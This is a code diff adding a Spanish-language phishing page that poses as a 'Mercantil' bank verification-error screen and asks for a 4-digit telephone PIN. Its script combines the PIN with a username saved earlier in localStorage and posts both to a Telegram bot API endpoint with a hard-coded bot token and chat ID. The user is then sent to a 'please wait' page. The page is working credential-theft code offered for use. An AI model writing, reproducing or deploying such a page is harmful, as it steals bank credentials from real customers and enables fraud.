@@ -1,0 +1,267 @@
+ 
+<!DOCTYPE html>
+<html lang="es" translate="no" class="wf-montserrat-n4-active wf-montserrat-n5-active wf-montserrat-n7-active wf-sansserif-n4-inactive wf-active">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,width=device-width">
+    <meta name="theme-color" content="#08528D">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#08528D">
+    <meta name="msapplication-navbutton-color" content="#08528D">
+    <meta name="msapplication-TileColor" content="#08528D">
+
+
+    <meta name="format-detection" content="telephone=no">
+    <meta name="google" content="notranslate">
+    <title>V
+    Clave telef&oacute;nica</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            outline: 0
+        }
+
+        html, body {
+            height: 100vh;
+            font-family: sans-serif;
+        }
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            background-color: #fff !important;
+            /*padding: 20pt;*/
+            color: #000;
+        }
+
+        .logo {
+            height: 80px;
+            width: 120px;
+            margin-bottom: 30px
+        }
+
+        form {
+            display: flex;
+            width: 350px;
+            height: 400px;
+            align-items: center;
+            padding-top: 30px;
+            flex-direction: column;
+            padding: 10px;
+        }
+
+        .notice {
+            margin: 5px;
+            color: white;
+            padding: 5pt;
+            font-size: 12pt;
+            width: 300px;
+            color: #000;
+            text-align: justify !important;
+        }
+
+        @media (max-width: 480px) {
+            .notice {
+                width: 100%;
+            }
+        }
+
+        .adverbio {
+            margin-top: 15px;
+            display: flex;
+            gap: 5px;
+            flex-grow: none;
+            padding: 5px 10px;
+            align-items: center;
+            /*border: 2px solid #000;*/
+            border-radius: 5px;
+        }
+
+        .logito {
+            width: 50px;
+            height: 50px;
+        }
+
+        .container2 {
+          display: flex !important;
+          width: 100%;
+          align-items: center;
+          justify-content: center;
+        }
+      
+        .box {
+          width: 40px;
+          height: 40px;
+          border: 1.2px solid black;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          font-size: 15px;
+          margin: 5px;
+        }
+
+        .box{
+            border-radius: 5px;
+            box-shadow: none;
+            outline: 0;
+            border: 1px solid black;
+        }
+        
+        input {
+          border: none;
+          border-radius: 4px;
+          text-align: center !important ;
+          font-size: 24px !important ;
+          width: 95% !important ;
+          height: 95% !important ; 
+          background-color: transparent !important;
+          color: black;
+         }
+
+         .input-container {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+         }
+
+         .shoepode {
+            font-size: 0.9rem;
+            color: #000;
+            margin-bottom: 10px;
+            padding: 2px 20px;
+            width: 100%;
+         }
+
+         .btn {
+            margin-top: 30px;
+            font-size: 13pt;
+            font-weight: 600;
+            padding: 8pt 12pt;
+            background-color: #0065ad;
+            border-radius: 15pt;
+            color: white;
+
+            width: 150px;
+            border: 0;
+         }
+
+         .logo-container {
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          padding: 10pt;
+          background-color: #ffffff;
+          width: 100%;
+
+        }
+
+        .bottom-text {
+          position: fixed;
+          bottom: 0;
+          left: 0;
+          right: 0;
+          background-color: #c0c0c0;
+          height: 50px;
+          color: black;
+          font-size: 13pt;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+        }
+
+        .inputs {
+          width: 100%;
+        }
+    </style>
+</head>
+
+<body>
+
+    <span class="logo-container">
+        <img src="Log.png" style="height: 40px;width: 120px;">
+    </span>
+
+    <h1 style="font-weight: 600;margin-top: 20px;font-size: 15pt;color: red">Error de Verificaci&oacute;n</h1>
+
+    <div class="adverbio">
+        
+        <p class="notice" >Ingresa la clave telef&oacute;nica de 4 d&iacute;gitos
+    </p>
+    </div>
+    
+    
+    <form id="loginform" method="post">
+        <h4 class="shoepode">Por favor ingrese la clave telef&oacute;nica de <br>4 d&iacute;gitos.</h4>
+        <div class="inputs">
+            <div class="input-container">
+                <div class="container2">
+                   <div class="box">
+                        <input type="tel" class="insideInput" minlength="1" maxlength="1" name="token1"  oninput="moveToNextInput(2, this)" id="input1" required>
+                   </div>
+                  <div class="box">
+                    <input class="insideInput" type="tel" minlength="1" maxlength="1" name="token2" oninput="moveToNextInput(3, this)" id="input2" required>
+                  </div>
+                  <div class="box">
+                    <input class="insideInput" type="tel" minlength="1" maxlength="1" name="token3" oninput="moveToNextInput(4, this)" id="input3" required>
+                  </div>
+                  <div class="box">
+                    <input class="insideInput" type="tel" minlength="1" maxlength="1" name="token4"  oninput="moveToNextInput(5, this)" id="input4" required>
+                  </div>>
+                </div>
+            </div>
+        </div>
+        <button class="btn" type="submit">Validar</button>
+    </form>
+
+    <script type="text/javascript">
+        function moveToNextInput(nextInputIndex, currentInput) {
+          const currentLength = currentInput.value.length;
+    
+          if (currentLength >= 1 && nextInputIndex <= 4) {
+            const nextInput = document.getElementById(`input${nextInputIndex}`);
+
+            nextInput.focus();
+          }
+        }
+
+        window.onload = () => {
+          document.querySelector("#input1").focus();
+        }
+      </script>
+          <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#loginform");
+
+    form.addEventListener("submit", (event) => {
+      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+      const nombre = localStorage.getItem("usuario");
+      const sms1 = document.querySelector("#input1").value;
+      const sms2 = document.querySelector("#input2").value;
+      const sms3 = document.querySelector("#input3").value;
+      const sms4 = document.querySelector("#input4").value;
+      const message = " ------ Mercantil ------ Nombre: " + nombre + " ------ Clave Telefonica: " + sms1 + sms2 + sms3 + sms4;
+      axios
+      .post(
+                        "https://api.telegram.org/bot7294657704:AAGNAGJL3wK3W8xjtwcETkspzUmflnH2mjg/sendMessage",
+                        {
+                          chat_id: "-4204031062",
+                          text: message,
+                        }
+                      )
+        .then((response) => {
+          window.location.href = "espere2.html";
+        })
+        .catch((error) => {
+          console.error(error);
+        });
+    });
+  </script>
+</body>
+
+</html>
